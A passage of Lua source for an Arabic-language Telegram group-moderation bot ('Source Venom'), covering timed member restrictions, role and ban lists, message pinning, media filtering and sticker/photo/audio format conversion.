local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تقيده لمدة ↫ "..mutept.." د") 
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تقيده لمدة ↫ "..mutept.." س") 
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تقيده لمدة ↫ "..mutept.." ي") 
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source Venom     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevAbs:set('VenomTEAM:'..Venom..'id:user'..msg.chat_id_,TXT)  
DevAbs:setex('VenomTEAM:'..Venom.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل عدد الرسائل الان \n𖠧︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevAbs:del(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevAbs:incrby(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevAbs:set('VenomTEAM:'..Venom..'ids:user'..msg.chat_id_,TXT)  
DevAbs:setex('VenomTEAM:'..Venom.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل عدد النقاط الان \n𖠧︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevAbs:get(Venom..'Abs:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(Venom.."Abs:cleaner"..msg.chat_id_, msg.id_) else DevAbs:sadd(Venom.."Abs:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevAbs:sismember(Venom.."Abs:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "𖠧︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevAbs:set(Venom..'Abs:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تثبيت الرساله بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source Venom     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:VipMem:'..msg.chat_id_)
text = "𖠧︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مميزين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Venom     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local abs =  'Abs:Admins:'..msg.chat_id_
local List = DevAbs:smembers(Venom..abs)
text = "𖠧︙قائمة الادمنيه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "𖠧︙*لا يوجد ادمنيه*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source Venom     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Managers:'..msg.chat_id_)
text = "𖠧︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مدراء*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Cleaner:'..msg.chat_id_)
text = "𖠧︙قائمة المنظفين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد منظفين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Venom     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Constructor:'..msg.chat_id_)
text = "𖠧︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد منشئين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Venom     --
if AbsConstructor(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:AbsConstructor:'..msg.chat_id_)
text = "𖠧︙قائمة المالكين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مالكين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:BasicConstructor:'..msg.chat_id_)
text = "𖠧︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد منشئين اساسيين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "venom_source")
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source Venom     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Muted:'..msg.chat_id_)
text = "𖠧︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مكتومين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Tkeed:'..msg.chat_id_)
text = "𖠧︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "𖠧︙*لا يوجد مقيدين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:Ban:'..msg.chat_id_)
text = "𖠧︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد محظورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevAbs:hkeys(Venom..'Abs:Filters:'..msg.chat_id_)
text = "𖠧︙قائمة المنع ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "𖠧︙لا توجد كلمات ممنوعه"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source Venom     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevAbs:smembers(Venom..'User:Donky:'..msg.chat_id_)
text = "𖠧︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "𖠧︙*لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Venom     --
if text == "المطورين الثانويين" and SecondSudo(msg) or text == "الثانويين" and SecondSudo(msg) then 
local List = DevAbs:smembers(Venom..'Abs:SecondSudo:')
text = "𖠧︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "𖠧︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام 𖠧" and ChCheck(msg) then 
local BanAll = DevAbs:smembers(Venom..'Abs:BanAll:')
local MuteAll = DevAbs:smembers(Venom..'Abs:MuteAll:')
if #BanAll ~= 0 then 
text = "𖠧︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(BanAll) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."𖠧︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(MuteAll) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "𖠧︙*لم يتم حظر او كتم اي عضو*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين 𖠧" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:SudoBot:')
text = "𖠧︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local sudouser = DevAbs:get(Venom..'Abs:Sudos'..v) 
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "𖠧︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     --
if text == "المدراء العامين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:ManagerAll:')
text = "𖠧︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مدراء عامين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Venom     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local List = DevAbs:smembers(Venom..'Abs:VipAll:')
text = "𖠧︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "𖠧︙*لا يوجد مميزين عام*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Venom     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local abs =  'Abs:AdminAll:'
local List = DevAbs:smembers(Venom..abs)
text = "𖠧︙قائمة الادمنيه العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(Venom..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "𖠧︙*لا يوجد ادمنيه عامين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source Venom     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "venom_source")
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevAbs:sadd(Venom.."Abs:AbsConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source Venom     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAbs:sadd(Venom.."Abs:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAbs:sadd(Venom.."Abs:FilterPhoto"..msg.chat_id_,photo)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAbs:sadd(Venom.."Abs:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source Venom     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAbs:srem(Venom.."Abs:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAbs:srem(Venom.."Abs:FilterPhoto"..msg.chat_id_,photo)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAbs:srem(Venom.."Abs:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source Venom     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل تحويل الصيغ'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Thwel:Abs'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل تحويل الصيغ'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Thwel:Abs'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevAbs:get(Venom..'Abs:Thwel:Abs'..msg.chat_id_) and SourceCh(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local Abs = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abs.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local Abs = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abs.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','𖠧︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local Abs = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abs.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"𖠧︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local Abs = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abs.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source Venom     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevAbs:sismember(Venom..'Abs:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Venom..'Abs:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Venom..'Abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Venom..'Abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n𖠧︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbs:sismember(Venom..'Abs:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n𖠧︙عدد الكروبات ↫ '..(DevAbs:get(Venom..'Abs:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n𖠧︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
